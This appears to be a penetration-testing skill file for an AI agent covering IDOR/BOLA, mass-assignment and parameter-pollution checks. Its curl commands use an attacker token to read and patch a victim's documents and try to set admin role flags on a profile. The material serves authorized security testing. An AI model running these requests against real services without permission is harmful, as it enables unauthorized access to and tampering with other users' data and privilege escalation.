---
name: business-logic-and-idor
description: Evaluates multi-tenant authorization barriers, Insecure Direct Object References (IDOR), parameter tampering, and privilege escalation logic.
---

# Business Logic & IDOR Testing Skill

## Purpose
Systematically discover flaws in multi-tenant authorization logic, IDOR/BOLA, mass-assignment vulnerabilities, and price/status tampering that automated scanners cannot detect.

## Inputs
- Candidate object endpoints: `/workspace/output/parameters/<target>/idor.txt`
- Authentication profiles: User A (Attacker token) and User B (Victim object IDs)

## Workflow

### 1. Dual-Token Authorization Matrix Setup
Define environment variables for multi-account testing:
```bash
USER_A_AUTH="Bearer <token_user_a>"
USER_B_AUTH="Bearer <token_user_b>"
VICTIM_OBJECT_ID="10842"
```

### 2. IDOR / BOLA Verification
Test whether User A can read, update, or delete User B's resources:

```bash
# Test 1: Cross-User Resource Read (GET)
curl -s -w "\nHTTP_STATUS:%{http_code}\n" \
     -H "Authorization: ${USER_A_AUTH}" \
     "https://target.com/api/v1/documents/${VICTIM_OBJECT_ID}" \
     -o /workspace/output/idor_read_response.json

# Test 2: Cross-User Resource Modification (PUT/PATCH)
curl -s -w "\nHTTP_STATUS:%{http_code}\n" \
     -X PATCH \
     -H "Authorization: ${USER_A_AUTH}" \
     -H "Content-Type: application/json" \
     -d '{"title": "Compromised Title"}' \
     "https://target.com/api/v1/documents/${VICTIM_OBJECT_ID}" \
     -o /workspace/output/idor_patch_response.json
```

### 3. Mass-Assignment & Privilege Escalation
Attempt to update user profile with elevated attributes:
```bash
curl -s -w "\nHTTP_STATUS:%{http_code}\n" \
     -X PUT \
     -H "Authorization: ${USER_A_AUTH}" \
     -H "Content-Type: application/json" \
     -d '{"name": "Alice", "role": "admin", "is_admin": true, "verified": true, "organization_id": 1}' \
     "https://target.com/api/v1/profile" \
     -o /workspace/output/mass_assignment_response.json
```

### 4. Method Switching & Parameter Pollution
If standard REST routes are blocked:
```bash
# Test URL parameter override
curl -s -H "Authorization: ${USER_A_AUTH}" "https://target.com/api/v1/documents?id=${VICTIM_OBJECT_ID}"
# Test array parameter pollution
curl -s -H "Authorization: ${USER_A_AUTH}" "https://target.com/api/v1/documents?id[]=${VICTIM_OBJECT_ID}"
# Test JSON parameter injection
curl -s -H "Authorization: ${USER_A_AUTH}" -X POST -H "Content-Type: application/json" -d "{\"id\": ${VICTIM_OBJECT_ID}}" "https://target.com/api/v1/documents"
```

## Evaluation Logic
1. If HTTP status is `200 OK` and response body contains User B's private data when requested with User A's token -> **CONFIRMED IDOR / BOLA**.
2. If HTTP status is `401 Unauthorized` or `403 Forbidden` -> **Properly Enforced**.
3. If HTTP status is `404 Not Found` with generic message -> **Safe / Object Filtered**.

## Output Artifacts
- `/workspace/reports/idor_finding_<id>.md` - Detailed evidence document including request/response pairs for User A and User B.
